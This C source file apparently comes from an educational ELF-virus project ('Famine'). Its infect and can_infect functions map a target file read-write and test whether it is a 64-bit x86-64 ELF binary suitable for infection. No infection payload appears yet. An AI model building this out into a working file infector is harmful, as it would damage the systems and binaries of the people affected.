/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
/*   Updated: 2024/10/31 14:13:38 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

bool	can_infect(const byte *file, const struct stat file_stat);

//	Infects the file located at path
//
//	Returns true on a critical error that needs to stop the whole infection program
bool	infect(const str path) {
	int64_t		fd;
	int64_t		ret;
	struct stat file_stat = {0};
	byte		*file_origin = NULL;

	(void)fd;
	(void)ret;

	open(fd, path, O_RDWR);

	fstat(ret, fd, &file_stat);
	if (ret)
		printf(FILE_LINE("fstat failed: %ld\n"), ret);

	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
		goto infect_end;

	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	close(fd);
	if (file_origin == MAP_FAILED)
		printf(FILE_LINE("fstat failed: %p\n"), file_origin);

	// Logic starts
	if (can_infect(file_origin, file_stat) == false)
		goto infect_end;
	
	printf("I can infect %s\n", path);

	// Logic ends
	infect_end:
	munmap(ret, file_origin, file_stat.st_size);

	return false;
}

//	Check if the file is compatible for infection
//
//	Returns true if it's compatible
//	Returns false if it's not
bool	can_infect(const byte *file, const struct stat file_stat) {
	const Elf64_Ehdr	*elf = (Elf64_Ehdr *)file;
	const Elf64_Shdr	*sections = NULL;
	uint64_t			offset = 0;
	Elf64_Off			text_end_off = 0;
	(void)file_stat;

	(void)offset;
	(void)text_end_off;

	if (((uint32_t *)file)[0] != 0x464c457f)
		return false;

	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
		return false;

	if (elf->e_machine != EM_X86_64)
		return false;

	offset = elf->e_shoff;

	sections = (Elf64_Shdr *)(file + elf->e_shoff);

	for (size_t i = 0; i < elf->e_shnum; i++) {
		printf("%s:\n", file + sections[elf->e_shstrndx].sh_offset + sections[i].sh_name);
		printf("\toffset: 0x%08lx\n", sections[i].sh_offset);
		printf("\tsize: 0x%08lx\n", sections[i].sh_size);
	}

	return true;
}
